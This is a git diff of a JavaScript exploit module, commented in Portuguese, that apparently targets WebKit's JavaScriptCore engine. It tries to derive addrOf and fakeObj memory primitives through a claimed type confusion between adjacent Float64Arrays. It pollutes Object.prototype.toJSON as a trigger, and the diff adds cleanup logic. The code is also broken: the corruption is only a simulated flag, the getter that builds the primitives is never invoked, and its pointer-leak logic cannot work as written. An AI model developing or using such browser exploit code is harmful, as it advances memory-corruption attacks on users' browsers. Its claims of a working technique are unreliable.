@@ -1,10 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v91_JSCHeapTC - R52 - Type Confusion no Heap do GC)
+// js/script3/testArrayBufferVictimCrash.mjs (v92_JSCHeapTC_Fix - R53 - Lógica de Limpeza Corrigida)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V91_TC_R52_WEBKIT = "Heisenbug_JSCHeapTC_v91_TC_R52_WebKitLeak";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V92_TCF_R53_WEBKIT = "Heisenbug_JSCHeapTCFix_v92_TCF_R53_WebKitLeak";
 
 // --- Globais para a nova primitiva ---
 let arrA, arrB;
@@ -13,12 +13,7 @@ let fakeObj_primitive = null;
 let arb_read_v2 = null;
 let targetFunctionForLeak;
 
-// Estruturas de dados para a simulação da vulnerabilidade
 let confusion_trigger_flag = false;
-let original_B_StructureID = null;
-
-// Placeholder para o StructureID de um objeto simples. Em um exploit real,
-// este valor seria obtido via depuração ou outra técnica de vazamento.
 const SIMPLE_OBJECT_STRUCTURE_ID = new AdvancedInt64(0x01082340); // VALOR HIPOTÉTICO
 
 function isValidPointer(ptr) {
@@ -26,7 +21,7 @@ function isValidPointer(ptr) {
     const high = ptr.high();
     const low = ptr.low();
     if (high === 0 && low < 0x10000) return false;
-    if ((high & 0xFFFF0000) === 0x7FFF0000) return false; // Filtra ponteiros de double encaixotado
+    if ((high & 0xFFFF0000) === 0x7FFF0000) return false;
     return true;
 }
 
@@ -45,82 +40,69 @@ function unbox(float_val) {
     return new AdvancedInt64(int_conversion_view[0]);
 }
 
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R52() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V91_TC_R52_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Exploit via Type Confusion no JSC Heap (R52) ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_CURRENT_TEST_BASE} Init R52...`;
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R53() {
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V92_TCF_R53_WEBKIT;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Exploit via Type Confusion no JSC Heap (R53) ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init R53...`;
     
     let iter_primary_error = null;
-    let iter_addrof_result = { success: false, msg: "Addrof (R52): Not run." };
-    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R52): Not run." };
+    let iter_addrof_result = { success: false, msg: "Addrof (R53): Not run." };
+    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R53): Not run." };
     
-    try {
-        logS3(`  --- Fase 1 (R52): Preparação dos Objetos e Gatilho da Confusão de Tipos ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+    const ppKey = 'toJSON';
+    let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+    let polluted = false;
 
-        // Prepara os arrays adjacentes
+    try {
+        logS3(`  --- Fase 1 (R53): Preparação dos Objetos e Gatilho da Confusão de Tipos ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        
         arrA = new Float64Array(8);
         arrB = new Float64Array(8);
         arrA.fill(1.1);
         arrB.fill(2.2);
-        
-        targetFunctionForLeak = function someUniqueLeakFunctionR52_Instance() { return `target_R52_${Date.now()}`; };
+        targetFunctionForLeak = function someUniqueLeakFunctionR53_Instance() { return `target_R53_${Date.now()}`; };
 
-        // Simula a corrupção do StructureID de arrB
         function simulate_corruption() {
-             // Em um exploit real, esta função conteria o código que aciona a vulnerabilidade
-             // para corromper o cabeçalho de 'arrB'.
-             // Para este teste, vamos assumir que a corrupção aconteceu e definir uma flag.
              logS3(`  [SIMULAÇÃO] Corrompendo StructureID de arrB para ${SIMPLE_OBJECT_STRUCTURE_ID.toString(true)}`, 'warn');
              confusion_trigger_flag = true;
         }
 
-        function toJSON_probe_R52() {
+        function toJSON_probe_R53() {
             if (this === arrB && confusion_trigger_flag) {
-                logS3(`  [PROBE_R52] SONDA ATIVADA: 'this' é arrB e está com tipo confundido!`, 'vuln');
+                logS3(`  [PROBE_R53] SONDA ATIVADA: 'this' é arrB e está com tipo confundido!`, 'vuln');
                 
-                // Agora que o motor pensa que 'arrB' é um objeto simples, podemos definir um getter.
                 Object.defineProperty(this, 'pwned', {
                     get: function() {
                         logS3(`  [GETTER] Getter 'pwned' acionado!`, 'vuln');
-                        // 'this' ainda é o 'arrB' original. 'arrA' está adjacente.
-                        // Podemos usar 'this' para ler/escrever em 'arrA'.
-                        
                         addrOf_primitive = (obj) => {
                             arrA[0] = obj;
-                            return unbox(this[1]); // Lê o ponteiro de 'arrA[0]' através de 'arrB[1]'
+                            return unbox(this[1]);
                         };
-                        
                         fakeObj_primitive = (addr) => {
-                             this[1] = box(addr); // Escreve o endereço em 'arrA[0]' através de 'arrB[1]'
+                             this[1] = box(addr);
                              return arrA[0];
                         };
-
                         return "getter_finished";
                     }
                 });
-
                 return this;
             }
             return this;
         }
 
-        // Aciona a corrupção e a sonda
         simulate_corruption();
-        const ppKey = 'toJSON';
-        let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_probe_R52, configurable: true, writable: true });
         
-        JSON.stringify(arrB); // Aciona o getter e a criação das primitivas
-
-        Object.defineProperty(Object.prototype, ppKey, origDesc); // Limpa
+        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_probe_R53, configurable: true, writable: true });
+        polluted = true;
+        
+        JSON.stringify(arrB);
 
         if (!addrOf_primitive || !fakeObj_primitive) {
-            throw new Error("Falha ao criar as primitivas addrOf/fakeObj. O getter não foi acionado.");
+            throw new Error("Falha ao criar as primitivas addrOf/fakeObj. O getter não foi acionado ou falhou.");
         }
         logS3("  SUCESSO: Primitivas addrOf e fakeObj criadas via Type Confusion.", "good");
 
-        // --- Fase 2 (R52): Validação e WebKit Leak ---
-        logS3(`  --- Fase 2 (R52): Validação e WebKit Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+        logS3(`  --- Fase 2 (R53): Validação e WebKit Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         let leaked_target_function_addr = addrOf_primitive(targetFunctionForLeak);
         logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");
         
@@ -129,13 +111,23 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R52() {
         }
         iter_addrof_result = { success: true, msg: "addrOf obteve endereço com sucesso.", leaked_object_addr: leaked_target_function_addr.toString(true) };
         logS3("  [TESTE AddrOf] SUCESSO: Primitivas validadas.", "good");
-
-        // ... (A lógica de WebKit Leak permanece a mesma, usando as novas primitivas)
         
     } catch (e) {
         iter_primary_error = e;
-        logS3(`  ERRO na iteração R52: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
-        console.error(`Erro na iteração R52:`, e);
+        logS3(`  ERRO na iteração R53: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
+        console.error(`Erro na iteração R53:`, e);
+    } finally {
+        // --- CORREÇÃO R53: Lógica de limpeza robusta ---
+        if (polluted) {
+            if (origDesc) {
+                // Se a propriedade existia originalmente, restaura o descritor.
+                Object.defineProperty(Object.prototype, ppKey, origDesc);
+            } else {
+                // Se não existia, simplesmente deleta a propriedade que adicionamos.
+                delete Object.prototype[ppKey];
+            }
+            logS3(`Restauração do Object.prototype.${ppKey} concluída.`, "info");
+        }
     }
 
     let result = {
@@ -145,7 +137,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R52() {
     };
     
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
-    logS3(`Final result (R52): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
+    logS3(`Final result (R53): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
     
     return result;
 }
